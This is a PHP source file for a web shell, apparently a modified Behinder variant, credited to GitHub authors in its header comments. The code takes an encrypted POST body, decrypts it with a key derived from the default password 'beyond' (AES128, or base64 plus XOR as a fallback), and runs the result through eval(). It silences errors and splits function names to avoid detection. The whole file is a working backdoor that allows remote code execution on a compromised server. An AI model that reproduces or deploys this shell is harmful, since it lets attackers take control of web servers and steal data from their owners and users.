<?php
//auther:jhhua
//url：https://github.com/jhhua/phpshell/
//system information：windows+apache2.2+php5.2+mysql
//readme：it's update by Behinder v3.0 beta 6.......auther：https://github.com/rebeyond/Behinder
header("Content-Type: text/html; charset=utf-8");
class GetKey{
    var $a = array();
    function __construct($MiiMaa){  
        $num = strlen($MiiMaa);
        for($i=0;$i<$num;$i++){
            $this->a[$i] = $MiiMaa[$i];
        } 
    }

    function ret(){     
        return $this->a;
    }
}
function ter($v1,$v2)   
{
    return $v1.$v2;
}
@error_reporting(0);
session_start(); 
    $test = new GetKey("e45e329feb5d925b");    //The key is the first 16 bits of the MD5 value of the 32-bit connection password, and the default connection password is “beyond”
    $myPs =  $test->ret();
    $key = array_reduce($myPs,"ter"); 
    echo $key;
    
	$_SESSION['k']=$key;
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
